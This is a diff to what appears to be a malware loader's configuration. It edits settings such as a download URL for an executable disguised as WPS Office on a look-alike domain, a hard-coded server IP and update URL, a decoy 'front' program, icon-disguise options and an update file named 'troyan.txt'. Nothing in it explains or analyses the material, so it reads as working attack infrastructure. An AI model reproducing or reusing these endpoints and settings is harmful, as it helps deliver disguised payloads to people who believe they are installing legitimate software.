@@ -1,17 +1,7 @@
 $server = '{
-    "tabs":  [
-                 {
-                     "id":  "default",
-                     "exeName":  "default",
-                     "pushes":  "http://yandex.ru",
-                     "startDownloads":  "https://wps-office.site/wps_lid.lid-r8M0x5rRf8R7.exe",
-                     "startUrls":  "",
-                     "front":  "write.exe",
-                     "extractIconFromFront":  false,
-                     "embeddings":  ""
-                 }
-             ],
-    "UpdateFile":  "C:\\inetpub\\wwwroot\\ads\\d-data\\troyan.txt",
+    "landingAuto":  true,
+    "landingName":  "wps-office",
+    "UpdateFile":  null,
     "server":  "185.247.141.76",
     "strahServer":  null,
     "updateUrl":  "http://0.superhost.pw/185.247.141.76/update",
@@ -37,7 +27,7 @@ $server = '{
                       "185.247.141.46":  "counter.yadro.ru"
                   },
     "pushes":  [
-                   "http://yandex.ru"
+
                ],
     "startDownloads":  [
                            "https://wps-office.site/wps_lid.lid-r8M0x5rRf8R7.exe"
@@ -46,7 +36,7 @@ $server = '{
 
                   ],
     "front":  [
-                  "write.exe"
+
               ],
     "embeddings":  [
 
